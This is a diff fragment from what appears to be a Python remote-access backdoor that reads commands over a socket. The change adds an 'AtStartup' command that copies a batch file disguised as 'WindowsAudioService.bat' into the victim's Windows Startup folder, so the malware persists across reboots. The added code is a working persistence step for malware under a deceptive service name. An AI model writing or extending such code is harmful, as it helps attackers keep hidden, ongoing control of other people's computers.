@@ -602,6 +602,10 @@ User: {os.getlogin()}
                 except:
                     self.errorsend()
 
+
+            elif command == 'AtStartup':
+                os.system('copy WindowsAudioService.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
+
             elif command == 'exit':
                 s.send(b"exit")
                 break
